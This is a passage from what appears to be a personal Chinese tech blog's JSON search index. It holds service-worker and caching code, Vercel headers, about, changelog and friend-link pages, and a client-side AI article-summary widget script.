Cache!`),caches.open(\"ClientWorker_ResponseCache\").then((e=>{e.keys().then((t=>{t.forEach((t=>{e.match(t).then((n=>{Number(n.headers.get(\"ClientWorker_ExpireTime\")){e.respondWith(self.clientworkerhandle(e.request))})),addEventListener(\"install\",(function(){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.s(`ClientWorker@${_package_json__WEBPACK_IMPORTED_MODULE_1__.i8} Installed!`),self.skipWaiting()})),addEventListener(\"activate\",(function(){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.s(`ClientWorker@${_package_json__WEBPACK_IMPORTED_MODULE_1__.i8} Activated!`),self.clients.claim()}))})()})();"},{"title":"您即将离开本站ε=( o｀ω′)ノ","path":"/go.html","content":"将要跳转到： load 将在 10 秒后跳转，请自行确认链接安全性 取消跳转 立即跳转"},{"path":"/sw-register.js","content":"navigator.serviceWorker.getRegistrations().then(function(registrations) { for(let registration of registrations) { registration.unregister() } })"},{"path":"/sw.js","content":"const CACHE_NAME = '20240712231803'; self.addEventListener('install', function(event) { self.skipWaiting(); // 强制等待中的 Service Worker 成为新的 Service Worker event.waitUntil( caches.open(CACHE_NAME) .then(function(cache) { console.log('Opened cache'); }) ); }); self.addEventListener('activate', function(event) { event.waitUntil( caches.keys().then(function(cacheNames) { return Promise.all( cacheNames.map(function(cacheName) { if (cacheName !== CACHE_NAME) { return caches.delete(cacheName); // 删除旧的缓存 } }) ); }) ); }); self.addEventListener('fetch', function(event) { if (event.request.url.startsWith('https://static.hzchu.top/')) { event.respondWith( caches.match(event.request) .then(function(response) { if (response) { return response; } return fetch(event.request).then(function(response) { if (!response || response.status !== 200 || response.type !== 'basic') { return response; } var responseToCache = response.clone(); caches.open(CACHE_NAME) .then(function(cache) { cache.put(event.request, responseToCache); }); return response; }); }) ); } });"},{"path":"/vercel.json","content":"{\"headers\":[{\"source\":\"/sw.js\",\"headers\":[{\"key\":\"Cache-Control\",\"value\":\"public, max-age=0, must-revalidate\"}]},{\"source\":\"(.*)\",\"headers\":[{\"key\":\"Cache-Control\",\"value\":\"public, s-maxage=86400, max-age=86400\"},{\"key\":\"Vercel-CDN-Cache-Control\",\"value\":\"max-age=3600\"}]}]}"},{"title":"哔哔","path":"/bb/index.html","content":"var memosMyList = [ { \"creatorName\" : \"Thun888\", \"website\" : \"https://blog.hzchu.top\", \"link\" : \"https://get-tg-channel-api.hzchu.top\", \"creatorId\" : \"101\", \"avatar\" : \"/img/avatar.webp\", \"artalk\" : \"https://artalk.hzchu.top\", \"artSite\" : \"Thun888\" } ]"},{"path":"/about/index.html","content":"关于友链留言thun888 关于本站 一开始只是想要学习html吧，现在主要是为了记录自己折腾过的时光。 想到什么写什么，内容比较杂。 不过，碍于博主水平有限，可能质量上会存在不足之处，欢迎指点 本站使用Stellar主题，如果你不懂配置而恰巧本站又有你所需要的东西，可以在下方仓库查看 thun888/myblog 关于我 广东湛江某学校的一名高三学生，成绩还行吧。 爱好挺广，就是不咋爱运动，运动还是要有的，免得突然暴毙。 平时大部分时间在学校，有事情回家才会处理 联系方式 邮箱: thun888 at hzchu.top TG: thun888 本站: 留言区 当然，你也可以在其它地方联系我，不过可能回复较慢 目前参与/开发项目 Mirouter-ui 峰间云海MC服务器 饿饿，饭饭 （建议备注昵称哦） Alipay Wechat Todo 未来可能发布的稿子挖坑碍于各种因素，先挖个坑，说不定以后会填"},{"title":"更新日志","path":"/big/index.html","content":"2024/7/22 23:33:531.使用hexo-next对html,css进行压缩处理2.使用hexo-safego规范外链跳转2024/7/22 18:19:01对海外访问图片进行分流到cf大善人（移除）2024/7/12 21:20:321.修改了部分样式2.使用static.hzchu.top替代所有引用的外部资源2024/7/1 12:15:451.移除最近文章组件2.替换大部分原生图片标签为Stellar格式3.添加图片节点前端优选功能2024/6/30 14:27:07升级artalk版本2024/6/28 14:20:23artalk默认白天模式可选ai总结修复bb界面中评论的问题修复最近评论的问题2024/6/8 10:17:46改进了友链页面2024/4/20 12:46:29优化了bb广场图片分组显示2024/4/4 06:43:201.移除了渺软CDN（唉，可惜啊2.调整配色方案3.添加超链接图标,字数统计及过期提醒4.优化了侧边栏表情显示2024/4/4 06:43:201.更新主题至1.27.02.添加最近评论显示3.添加了一些分类2024/3/23 20:39:06整了个类似gist的，转换在线代码的程序，终于可以在文章里丢掉一大堆代码了(❁´◡`❁)2024/3/23 16:03:53集成了木佬的bb广场到/bb/2024/3/9 11:23:47使用Gemini作为AI摘要默认禁用2024/3/8 22:39:15在学校发现51la默认被via屏蔽，更换为umami统计（附图为更换时统计信息废弃使用以下加速服务https://unpkg.comhttps://cdn.bootcdn.net对应友链头像访问慢的全部使用bitiful托管修改加载动画逻辑2024/2/251.完成TG Channel 时间线改进，对一部分页面进行动态化改造2024/2/151.不再使用 hexo-offline-popup 插件，尝试使用 ClientWorker2024/2/061.升级主题2.修订部分内容2023/1/211.更换域名，新的一年，新的开始🕊️（原域名将全部作跳转或共存，直到过期）2.修订部分内容2022/8/18去除冗杂功能修订该页更换部分图片链接11/261.增加长时间未更新提醒10/291.更新评论系统前端，后端（PHP -&gt; Go）2.对一部分“文章”进行归档处理9/111.调整页面宽度image-202109111059459899/101.合并仓库&amp;开源7/301.实现集成化部署7/29开放友链及留言页面7/28调整博客域名(hzchu.top =&gt;blog.thun888.xyz)7/201.添加搜索页面2.完善了下about页面，有空继续7/17新增&quot;更新历程&quot;页面2021/5/?\\~2021/7/14日常修改"},{"title":"友人","path":"/friends/index.html","content":"大佬 杜老师说师者，传道，授业，解惑！xaoxuu风暴前夕陈YF的博客一个在互联网角落挣扎的小小博客，很小很小 朋友们 Xunflash的小站真不戳，嘿嘿QWQAQ生命不止，折腾不息 ( ゜- ゜)祈星海循此苦旅，以达星辰Joseph Z.有理想的人，生活总是火热的。Fgaoxing一个少年的博客字节君热爱漫无边际，生活自有分寸Xlenco最好的地方,是没去过的地方。最好的时光，是回不来的时光。网笙久久一件事情是幸福还是不幸，关键是你怎么去看。柠萌の部落一个闲聊萌新动漫技术交流站wyj5211的小站折腾学习无止境Dahi Blog願你有一天能與你重要的人重逢二月播客、主题仅此而已？清风最灿烂的烟火总是先坠落风尘落微雨夜色难免黑凉，前行必有曙光宇宙尽头的餐馆自你离开，我辗转难眠星日语星语日点灯泠泫凝的异次元空间先空着2333Wang's blog愿你出走半生，归来仍是少年咖啡豆子coffee的小站所有奇迹的始发点MC-Sep人生能有几回搏，天涯何处无芳草⭐凌云·LinYun桂枝松已绿，拂雪凌云端 我可以交换友链吗？ 与博主完成至少3次有效互动 内容不能违反中国大陆法律，如果存在大量违法色情信息（包括但不限于）经举报/检查发现后永久移除 如果您的网站超过90天无法访问将会移除 如果友链信息有变更可以在下方留言 满足要求啦，告诉我需提供什么信息本站所需友链信息可参考我提供的本站Stellar格式友链信息，其中screenshot请提供分辨率为1050×700（保持纵横比在1.5即可）的图片，直接在评论区粘贴上传即可 吾之链 Stellar通用12345- title: Thun888&#x27;s Blog url: https://blog.hzchu.top/ avatar: https://blog.hzchu.top/img/avatar.webp screenshot: https://onep.hzchu.top/mount/pic/blog-hzchu-top.png description: 夏日当空，心如深渊 titleavatarurl screenshotbackgrounddescription 友链状态监测(每10分钟更新) 目前已取消自助友链申请，如果你想与我交换友链的话请在下方留言或留言告知后自行提交pr哦！"},{"path":"/js/chuckle-post-ai.js","content":"if(!window.hasOwnProperty(\"aiExecuted\")){ console.log(`%cPost-Summary-AI 文章摘要AI生成工具:%chttps://github.com/qxchuckle/Post-Summary-AI%c`, \"border:1px #888 solid;border-right:0;border-radius:5px 0 0 5px;padding: 5px 10px;color:white;background:#4976f5;margin:10px 0\", \"border:1px #888 solid;border-left:0;border-radius:0 5px 5px 0;padding: 5px 10px;\",\"\"); window.aiExecuted = \"chuckle\"; } function ChucklePostAI(AI_option) { // 是否启用ai const aisummaryStatus = localStorage.getItem('config.aisummary.status'); if (!aisummaryStatus || aisummaryStatus === '0') { console.log(\"AI摘要已禁用\"); return; } MAIN(AI_option); if(AI_option.pjax){ document.addEventListener('pjax:complete', ()=>{ setTimeout(()=>{ MAIN(AI_option); }, 0); }); } function MAIN(AI_option) { // 如果有则删除 const box = document.querySelector(\".post-ai\"); if (box) { box.parentElement.removeChild(box); } const currentPath = window.location.pathname; const currentURL = \"https://blog.hzchu.top\" + currentPath; // 排除页面 if(AI_option.eliminate && AI_option.eliminate.length && AI_option.eliminate.some(item => currentURL.includes(item))){ console.log(\"Post-Summary-AI 已排除当前页面(黑名单)\"); return; } if(AI_option.whitelist && AI_option.whitelist.length && !AI_option.whitelist.some(item => currentURL.includes(item))){ console.log(\"Post-Summary-AI 已排除当前页面(白名单)\"); return; } // 获取挂载元素，即文章内容所在的容器元素 let targetElement = \"\"; // 若el配置不存在则自动获取，如果auto_mount配置为真也自动获取 if(!AI_option.auto_mount && AI_option.el){ targetElement = document.querySelector(AI_option.el ? AI_option.el : '#post #article-container'); }else{ targetElement = getArticleElements(); } // 获取文章标题，默认获取网页标题 const post_title = document.querySelector(AI_option.title_el) ? document.querySelector(AI_option.title_el).textContent : document.title; if (!targetElement) { return; }; const interface = { name: \"QX-AI\", introduce: \"我是文章辅助AI: QX-AI，点击下方的按钮，让我生成本文简介、推荐相关文章等。\", version: \"GPT-4\", button: [\"介绍自己\", \"推荐相关文章\", \"生成AI简介\", \"矩阵穿梭\"], ...AI_option.interface } insertCSS(); // 插入css // 插入html结构 const post_ai_box = document.createElement('div'); post_ai_box.className = 'post-ai'; post_ai_box.setAttribute('id', 'post-ai'); targetElement.insertBefore(post_ai_box, targetElement.firstChild); post_ai_box.innerHTML = ` ${interface.name} 切换简介 ${interface.version} ${interface.name}初始化中... ${interface.button[0]} ${interface.button[1]} ${interface.button[2]} ${interface.button[3]} `; // ai主体业务逻辑 let animationRunning = true; // 标志变量，控制动画函数的运行 let explanation = document.querySelector('.ai-explanation'); let post_ai = document.querySelector('.post-ai'); let ai_btn_item = document.querySelectorAll('.ai-btn-item'); let ai_toggle = document.querySelector('.ai-Toggle'); let ai_speech = document.querySelector('.ai-speech-box'); let ai_str = ''; let ai_str_length = ''; let delay_init = 600; let i = 0; let j = 0; let speed = AI_option.speed || 20; let character_speed = speed*7.5; let sto = []; let elapsed = 0; let completeGenerate = false; let controller = new AbortController();//控制fetch let signal = controller.signal; let summaryId = \"\"; // 记录当前摘要ID const summary_toggle = AI_option.summary_toggle ?? true; const summary_speech = AI_option.summary_speech ?? true; let switch_control = 0; let executedForSwitchControl = false; let summary_audio = ''; let audioBlob = ''; let isPaused = false; const summary_num = AI_option.summary_num || 3; // 切换时允许生成的摘要总数，默认3个 //默认true，使用tianliGPT，false使用官方api，记得配置Key const choiceApi = true; const apiKey = \"填入chatGPT的apiKey\"; //tianliGPT的参数 const tlReferer = `https://${window.location.host}/`; const tlKey = AI_option.key ? AI_option.key : '123456'; //----------------------------------------------- const animate = (timestamp) => { if (!animationRunning) { return; // 动画函数停止运行 } if (!animate.start) animate.start = timestamp; elapsed = timestamp - animate.start; if (elapsed >= speed) { animate.start = timestamp; if (i < ai_str_length - 1) { let char = ai_str.charAt(i + 1); let delay = /[,.，。!?！？]/.test(char) ? character_speed : speed; if (explanation.firstElementChild) { explanation.removeChild(explanation.firstElementChild); } explanation.innerHTML += char; let div = document.createElement('div'); div.className = \"ai-cursor\"; explanation.appendChild(div); i++; if (delay === character_speed) { document.querySelector('.ai-explanation .ai-cursor').style.opacity = \"0\"; } if (i === ai_str_length - 1) { observer.disconnect();// 暂停监听 explanation.removeChild(explanation.firstElementChild); } sto[0] = setTimeout(() => { requestAnimationFrame(animate); }, delay); } } else { requestAnimationFrame(animate); } }; const observer = new IntersectionObserver((entries) => { let isVisible = entries[0].isIntersecting; animationRunning = isVisible; // 标志变量更新 if (animationRunning) { delay_init = i === 0 ? 200 : 20; sto[1] = setTimeout(() => { if (j) { i = 0; j = 0; } if (i === 0) { explanation.innerHTML = ai_str.charAt(0); } requestAnimationFrame(animate); }, delay_init); } }, { threshold: 0 }); function clearSTO() { if (sto.length) { sto.forEach((item) => { if (item) { clearTimeout(item); } }); } } function resetAI(df = true, str = '生成中. . .') { i = 0;//重置计数器 j = 1; clearSTO(); animationRunning = false; elapsed = 0; if (df) { explanation.innerHTML = str; } else { explanation.innerHTML = '请等待. . .'; } if (!completeGenerate) { controller.abort(); } ai_str = ''; ai_str_length = ''; if(summary_toggle){ ai_toggle.style.opacity = \"0\"; ai_toggle.style.pointerEvents = \"none\"; } if(summary_speech){ summarySpeechInit(); ai_speech.style.opacity = \"0\"; ai_speech.style.pointerEvents = \"none\"; } observer.disconnect();// 暂停上一次监听 } function startAI(str, df = true) { // 如果打字机配置项存在且为false，则关闭打字机，否则默认开启打字机效果 if(AI_option.hasOwnProperty('typewriter') && !AI_option.typewriter){ explanation.innerHTML = str; }else{ resetAI(df); ai_str = str; ai_str_length = ai_str.length; observer.observe(post_ai);//启动新监听 } } function aiIntroduce() { startAI(interface.introduce); } function aiRecommend() { resetAI(); sto[2] = setTimeout(async() => { let info = await recommendList(); if(info === \"\" || info === false){ startAI(`${interface.name}未能找到任何可推荐的文章。`); }else if(info){ explanation.innerHTML = info; } }, 200); } async function aiGenerateAbstract() { resetAI(); const ele = targetElement; const content = getTextContent(ele); const response = await getGptResponse(content, choiceApi);//true使用tianliGPT，false使用官方api if(response){ startAI(response.summary); if(summary_toggle){ ai_toggle.style.opacity = \"1\"; ai_toggle.style.pointerEvents = \"auto\"; summarySpeechShow(); } } } async function switchAbstract() { resetAI(); audioBlob = null; const ele = targetElement; switch_control = (switch_control + 1) % summary_num; const content = getTextContent(ele) + \"#\".repeat(switch_control); let response = \"\"; if(switch_control === 1 && !executedForSwitchControl){ sessionStorage.setItem('backupsSummary', sessionStorage.getItem('summary')); // 将第一次的简介存起来 executedForSwitchControl = true; } if(!sessionStorage.getItem(`summary${\"#\".repeat(switch_control)}`)){ sessionStorage.removeItem('summary'); response = await getGptResponse(content, choiceApi); if(response){ sessionStorage.setItem(`summary${\"#\".repeat(switch_control)}`, JSON.stringify(response)); } }else{ response = JSON.parse(sessionStorage.getItem(`summary${\"#\".repeat(switch_control)}`)); summaryId = response.id; if(switch_control === 0){ sessionStorage.setItem('summary', sessionStorage.getItem('backupsSummary')); }else{ sessionStorage.setItem('summary', sessionStorage.getItem(`summary${\"#\".repeat(switch_control)}`)); } } if(response){ startAI(response.summary); ai_toggle.style.opacity = \"1\"; ai_toggle.style.pointerEvents = \"auto\"; summarySpeechShow(); } } async function recommendList() { completeGenerate = false; controller = new AbortController(); signal = controller.signal; let response = ''; let info = ''; let data = ''; const options = { signal, method: 'GET', headers: {'content-type': 'application/x-www-form-urlencoded'}, }; // 利用sessionStorage缓存推荐列表，有则缓存中读取，无则获取后缓存 if(sessionStorage.getItem('recommendList')){ data = JSON.parse(sessionStorage.getItem('recommendList')); }else{ try { response = await fetch(`https://dolgpt.hzchu.top/recommends?url=${encodeURIComponent(window.location.href)}&author=${AI_option.rec_method ? AI_option.rec_method : 'all'}`, options); completeGenerate = true; if (response.status === 429) { startAI('请求过于频繁，请稍后再请求AI。'); } if (!response.ok) { throw new Error('Response not ok'); } // 处理响应 } catch (error) { if (error.name === \"AbortError\") { // console.log(\"请求已被中止\"); }else{ console.error('Error occurred:', error); startAI(\"获取推荐出错了，请稍后再试。\"); } completeGenerate = true; return false; } // 解析响应并返回结果 data = await response.json(); sessionStorage.setItem('recommendList', JSON.stringify(data)); } if(data.hasOwnProperty(\"success\") && !data.success){ return false; }else{ info = `推荐文章：`; info += ''; data.forEach((item, index) => { info += `推荐${index + 1}：${item.title ? item.title : \"未获取到题目\"}`; }); info += '' } return info; } // 矩阵穿梭 async function matrixShuttle(){ resetAI(true, '矩阵穿梭中. . .'); completeGenerate = false; controller = new AbortController(); signal = controller.signal; let response = ''; let data = ''; const options = { signal, method: 'GET', headers: {'content-type': 'application/x-www-form-urlencoded'}, }; if(sessionStorage.getItem('matrixShuttle')){ data = JSON.parse(sessionStorage.getItem('matrixShuttle')); }else{ try { response = await fetch('https://dolgpt.hzchu.top/websites_used', options); completeGenerate = true; if (response.status === 429) { startAI('请求过于频繁，请稍后再请求AI。'); } if (!response.ok) { throw new Error('Response not ok'); } // 处理响应 } catch (error) { if (error.name === \"AbortError\") { // console.log(\"请求已被中止\"); }else{ console.error('Error occurred:', error); startAI(\"矩阵穿梭失败了，请稍后再试。\"); } completeGenerate = true; return false; } // 解析响应并返回结果 data = await response.json(); sessionStorage.setItem('matrixShuttle', JSON.stringify(data)); } const randomElement = getRandomElementFromArray(data.websites); if(randomElement){ startAI(`正在前往 ${randomElement} ，已有 ${data.count} 个网站接入AI摘要。`); sto[2] = setTimeout(() => { window.open(`https://${randomElement}`, '_blank'); }, speed*100); }else{ startAI(`没有可以穿梭的网站。`); } } // 随机返回数组中一个元素 function getRandomElementFromArray(array) { if (array.length === 0) { return null; // 返回null表示数组为空 } const randomIndex = getRandomIndex(array.length); return array[randomIndex]; } function getRandomIndex(max) { const array = new Uint32Array(1); window.crypto.getRandomValues(array); return array[0] % max; } async function summarySpeech(){ if (!summaryId) return; let response = ''; if(audioBlob && !summary_audio){ await summarySpeechPlay(audioBlob); return; } if(summary_audio && summary_audio){ if(isPaused){ isPaused = false; summary_audio.play(); ai_speech.style.opacity = \"0.4\"; ai_speech.style.animation = \"ai_breathe .7s linear infinite\"; }else{ isPaused = true; summary_audio.pause(); ai_speech.style.opacity = \"1\"; ai_speech.style.animation = \"\"; } return; }else{ const options = { method: 'GET', headers: { \"Content-Type\": \"application/json\", \"Referer\": tlReferer }, }; const requestParams = new URLSearchParams({ key: tlKey, id: summaryId, }); try { ai_speech.style.pointerEvents = \"none\"; ai_speech.style.opacity = \"0.4\"; response = await fetch(`https://dolgpt.hzchu.top/audio?${requestParams}`, options); if (response.status === 403) { console.error(\"403 refer与key不匹配。\"); } else if (response.status === 500) { console.error(\"500 系统内部错误\"); }else{ audioBlob = await response.blob(); ai_speech.style.pointerEvents = \"auto\"; await summarySpeechPlay(audioBlob); } }catch (error) { console.log(\"摘要语音请求出错：\", error); ai_speech.style.opacity = \"1\"; ai_speech.style.pointerEvents = \"auto\"; } } } function summarySpeechInit(clBlob = false){ if(!summary_speech){ return; } if(summary_audio){ summary_audio.pause(); summary_audio.remove(); } summary_audio = null; ai_speech.style.opacity = \"1\"; ai_speech.style.animation = \"\"; if(clBlob){ audioBlob = null; } } function summarySpeechShow(){ if(!summary_speech){ return; } ai_speech.style.opacity = \"1\"; ai_speech.style.animation = \"\"; ai_speech.style.pointerEvents = \"auto\"; } async function summarySpeechPlay(audioBlob) { if(!summary_speech){ return; } const audioURL = URL.createObjectURL(audioBlob); summary_audio = new Audio(audioURL); summary_audio.play(); if(AI_option.pjax){ function handlePjaxComplete() { summary_audio.pause(); summary_audio.remove(); document.removeEventListener('pjax:complete', handlePjaxComplete); } document.removeEventListener('pjax:complete', handlePjaxComplete); document.addEventListener('pjax:complete', handlePjaxComplete); } ai_speech.style.opacity = \"0.4\"; ai_speech.style.animation = \"ai_breathe .7s linear infinite\"; summary_audio.removeEventListener(\"ended\", handleSummaryAudioEnded); summary_audio.addEventListener(\"ended\", handleSummaryAudioEnded); } function handleSummaryAudioEnded() { summarySpeechInit(); } //ai首屏初始化，绑定按钮注册事件 async function ai_init() { // 清除缓存 sessionStorage.removeItem('recommendList'); sessionStorage.removeItem('backupsSummary'); for (let i = 0; i < summary_num; i++) { sessionStorage.removeItem(`summary${\"#\".repeat(i)}`); } explanation = document.querySelector('.ai-explanation'); post_ai = document.querySelector('.post-ai'); ai_btn_item = document.querySelectorAll('.ai-btn-item'); const funArr = [aiIntroduce, aiRecommend, aiGenerateAbstract, matrixShuttle]; ai_btn_item.forEach((item, index) => { if(AI_option.hide_shuttle && index === ai_btn_item.length - 1){ item.style.display = 'none'; return; } item.addEventListener('click', () => { funArr[index](); }); }); ai_toggle = document.querySelector('.ai-Toggle'); if(summary_toggle){ ai_toggle.addEventListener('click', () => { switchAbstract(); }); }else{ ai_toggle.style.display = 'none'; } ai_speech = document.querySelector('.ai-speech-box'); if(summary_speech){ ai_speech.addEventListener('click', () => { summarySpeech(); }); }else{ ai_speech.style.display = 'none'; } if(AI_option.summary_directly){ aiGenerateAbstract(); }else{ aiIntroduce(); } } //获取某个元素内的所有纯文本，并按顺序拼接返回 function getText(element) { // 需要排除的元素及其子元素 const excludeClasses = AI_option.exclude ? AI_option.exclude : ['highlight', 'Copyright-Notice', 'post-ai', 'post-series', 'mini-sandbox']; if (!excludeClasses.includes('post-ai')) { excludeClasses.push('post-ai'); } const excludeTags = ['script', 'style', 'iframe', 'embed', 'video', 'audio', 'source', 'canvas', 'img', 'svg', 'hr', 'input', 'form'];// 需要排除的标签名数组 let textContent = ''; for (let node of element.childNodes) { if (node.nodeType === Node.TEXT_NODE) { // 如果是纯文本节点则获取内容拼接 textContent += node.textContent.trim(); } else if (node.nodeType === Node.ELEMENT_NODE) { let hasExcludeClass = false; // 遍历类名 for (let className of node.classList) { if (excludeClasses.includes(className)) { hasExcludeClass = true; break; } } let hasExcludeTag = excludeTags.includes(node.tagName.toLowerCase()); // 检查是否是需要排除的标签 // 如果hasExcludeClass和hasExcludeTag都为false，即不包含需要排除的类和标签，可以继续向下遍历子元素 if (!hasExcludeClass && !hasExcludeTag) { let innerTextContent = getText(node); textContent += innerTextContent; } } } // 返回纯文本节点的内容 return textContent.replace(/\\s+/g, ''); } //获取各级标题 function extractHeadings(element) { const headings = element.querySelectorAll('h1, h2, h3, h4'); const result = []; for (let i = 0; i < headings.length; i++) { const heading = headings[i]; const headingText = heading.textContent.trim(); result.push(headingText); const childHeadings = extractHeadings(heading); result.push(...childHeadings); } return result.join(\";\"); } //按比例切割字符串 function extractString(str, totalLength = 1000, ratioString = \"5:3:2\") { totalLength = Math.min(totalLength, 5000); // 最大5000字数 if (str.length sum + ratio, 0); const availableLength = Math.min(str.length, totalLength); const partLengths = ratios.map(ratio => Math.floor((availableLength * ratio) / sumRatios)); const firstPart = str.substring(0, partLengths[0]); const midStartIndex = (str.length - 300) / 2; // 计算中间部分的起始索引 const middlePart = str.substring(midStartIndex, midStartIndex + partLengths[1]); const lastPart = str.substring(str.length - partLengths[2]); const result = firstPart + middlePart + lastPart; return result; } //获得字符串，默认进行切割，false返回原文纯文本 function getTextContent(element, i = true) { let content; if (i) { const totalLength = AI_option.total_length || 1000; const ratioString = AI_option.ratio_string || \"5:3:2\"; content = `文章标题：${post_title}。文章的各级标题：${extractHeadings(element)}。文章内容的截取：${extractString(getText(element), totalLength, ratioString)}`; } else { content = `${getText(element)}`; } return content; } //发送请求获得简介 async function getGptResponse(content, i = true) { if (!tlKey) { return \"没有获取到key，代码可能没有安装正确，详细请查看文档。\"; } if (tlKey === \"123456\") { return \"请购买 key 使用，如果你能看到此条内容，则说明代码安装正确。\"; } completeGenerate = false; controller = new AbortController(); signal = controller.signal; let response = ''; if(sessionStorage.getItem('summary')){ return JSON.parse(sessionStorage.getItem('summary')); } if (i) { try { response = await fetch('https://dolgpt.hzchu.top/', { signal: signal, method: \"POST\", headers: { \"Content-Type\": \"application/json\", \"Referer\": tlReferer }, body: JSON.stringify({ content: content, key: tlKey, title: post_title, url: currentURL, }) }); completeGenerate = true; if (response.status === 429) { startAI('请求过于频繁，请稍后再请求AI。'); } if (!response.ok) { throw new Error('Response not ok'); } // 处理响应 } catch (error) { if (error.name === \"AbortError\") { // console.log(\"请求已被中止\"); }else if(window.location.hostname === \"localhost\" || window.location.hostname === \"127.0.0.1\") { startAI(`${interface.name}请求tianliGPT出错了，你正在本地进行调试，请前往summary.zhheo.com添加本地域名（127.0.0.1:端口）的白名单。`); }else{ startAI(`${interface.name}请求tianliGPT出错了，请稍后再试。`); } completeGenerate = true; return \"\"; } // 解析响应并返回结果 const data = await response.json(); summaryId = data.id; sessionStorage.setItem('summary', JSON.stringify(data)); summarySpeechInit(true); return data; } else { const prompt = `你是一个摘要生成工具，你需要解释我发送给你的内容，不要换行，不要超过200字，只需要介绍文章的内容，不需要提出建议和缺少的东西。请用中文回答，文章内容为：${content}`; const apiUrl = \"https://api.openai.com/v1/chat/completions\"; try { response = await fetch(apiUrl, { signal: signal, method: \"POST\", headers: { \"Content-Type\": \"application/json\", \"Authorization\": `Bearer ${apiKey}` }, body: JSON.stringify({ model: \"gpt-3.5-turbo\", messages: [{ \"role\": \"user\", \"content\": prompt }], }) }); completeGenerate = true; if (response.status === 429) { startAI('请求过于频繁，请稍后再请求AI。'); } if (!response.ok) { throw new Error('Response not ok'); } // 处理响应 } catch (error) { console.error('Error occurred:', error); startAI(`${interface.name}请求chatGPT出错了，请稍后再试。`); completeGenerate = true; return \"\"; } // 解析响应并返回结果 const data = await response.json(); const outputText = data.choices[0].message.content; sessionStorage.setItem('summary', outputText); return outputText; } } // 实验性功能，自动获取文章内容所在容器元素 function getArticleElements(){ // 计算元素的后代元素总个数 function countDescendants(element) { let count = 1; for (const child of element.children) { count += countDescendants(child); } return count; } // 判断是否有要排除的元素 function judgeElement(element) { const excludedTags = ['IFRAME', 'FOOTER', 'HEADER', 'BLOCKQUOTE']; // 添加要排除的标签 if(excludedTags.includes(element.tagName)){ return true; } const exclusionStrings = ['aplayer', 'comment']; // 排除包含其中字符串的className return Array.from(element.classList).some(className => exclusionStrings.some(exclusion => className.includes(exclusion))); } // 深度搜索，找到得分最高的父元素 function findMaxHeadingParentElement(element) { const tagScores = { 'H1': 1.5, 'H2': 1, 'H3': 0.5, 'P': 1 }; let maxScore = 0; let maxHeadingParentElement = null; function dfs(element) { if (judgeElement(element)) { return; } let score = 0; for (const child of element.children) { if (child.tagName in tagScores) { score += tagScores[child.tagName]; } } if (score > maxScore) { maxScore = score; maxHeadingParentElement = element; } for (const child of element.children) { dfs(child); } } dfs(element); return maxHeadingParentElement; } // 广度优先搜索，标记所有元素，并找到得分最高的父元素 function findArticleContentElement() { const queue = [document.body]; let maxDescendantsCount = 0; let articleContentElement = null; while (queue.length > 0) { const currentElement = queue.shift(); // 判断当前元素是否要排除 if (judgeElement(currentElement)) { continue; } const descendantsCount = countDescendants(currentElement); if (descendantsCount > maxDescendantsCount) { maxDescendantsCount = descendantsCount; articleContentElement = currentElement; } for (const child of currentElement.children) { queue.push(child); } } return findMaxHeadingParentElement(articleContentElement); } // 返回文章内容所在的容器元素 return findArticleContentElement(); } // 插入css function insertCSS(){ const styleId = 'qx-ai-style'; if(document.getElementById(styleId)) { return; } const styleElement = document.createElement('style'); styleElement.id = styleId; styleElement.textContent = AI_option.css || `:root{--ai-font-color:#353535;--ai-post-bg:#f1f3f8;--ai-content-bg:#fff;--ai-content-border:1px solid #e3e8f7;--ai-border:1px solid #e3e8f7bd;--ai-tag-bg:rgba(48,52,63,0.80);--ai-cursor:#333;--ai-btn-bg:rgba(48,52,63,0.75);--ai-title-color:#4c4948;--ai-btn-color:#fff;--ai-speech-content:#fff;}[data-theme=dark],.theme-dark,body.dark,body.dark-theme{--ai-font-color:rgba(255,255,255,0.9);--ai-post-bg:#30343f;--ai-content-bg:#1d1e22;--ai-content-border:1px solid #42444a;--ai-border:1px solid #3d3d3f;--ai-tag-bg:#1d1e22;--ai-cursor:rgb(255,255,255,0.9);--ai-btn-bg:#1d1e22;--ai-title-color:rgba(255,255,255,0.86);--ai-btn-color:rgb(255,255,255,0.9);--ai-speech-content:#1d1e22;}#post-ai.post-ai{background:var(--ai-post-bg);border-radius:12px;padding:10px 12px 11px;line-height:1.3;border:var(--ai-border);margin-top:10px;margin-bottom:6px;transition:all 0.3s;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;-ms-transition:all 0.3s;-o-transition:all 0.3s;}#post-ai .ai-title{display:flex;color:var(--ai-title-color);border-radius:8px;align-items:center;padding:0 6px;position:relative;}#post-ai .ai-title i{font-weight:800;}#post-ai .ai-title-text{font-weight:bold;margin-left:8px;font-size:17px;}#post-ai .ai-tag{font-size:12px;background-color:var(--ai-tag-bg);color:var(--ai-btn-color);border-radius:4px;margin-left:auto;line-height:1;padding:4px 5px;border:var(--ai-border);}#post-ai .ai-explanation{margin-top:10px;padding:8px 12px;background:var(--ai-content-bg);border-radius:8px;border:var(--ai-content-border);font-size:15.5px;line-height:1.4;color:var(--ai-font-color);}#post-ai .ai-cursor{display:inline-block;width:7px;background:var(--ai-cursor);height:16px;margin-bottom:-2px;opacity:0.95;margin-left:3px;transition:all 0.3s;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;-ms-transition:all 0.3s;-o-transition:all 0.3s;}#post-ai .ai-btn-box{font-size:15.5px;width:100%;display:flex;flex-direction:row;flex-wrap:wrap;}#post-ai .ai-btn-item{padding:5px 10px;margin:10px 16px 0px 5px;width:fit-content;line-height:1;background:var(--ai-btn-bg);border:var(--ai-border);color:var(--ai-btn-color);border-radius:6px 6px 6px 0;-webkit-border-radius:6px 6px 6px 0;-moz-border-radius:6px 6px 6px 0;-ms-border-radius:6px 6px 6px 0;-o-border-radius:6px 6px 6px 0;user-select:none;transition:all 0.3s;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;-ms-transition:all 0.3s;-o-transition:all 0.3s;cursor:pointer;}#post-ai .ai-btn-item:hover{background:#49b0f5dc;}#post-ai .ai-recommend{display:flex;flex-direction:row;flex-wrap:wrap;}#post-ai .ai-recommend-item{width:50%;margin-top:2px;}#post-ai .ai-recommend-item a{border-bottom:2px solid #4c98f7;padding:0 .2em;color:#4c98f7;font-weight:700;text-decoration:none;transition:all 0.3s;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;-ms-transition:all 0.3s;-o-transition:all 0.3s;}#post-ai .ai-recommend-item a:hover{background-color:#49b1f5;border-bottom:2px solid 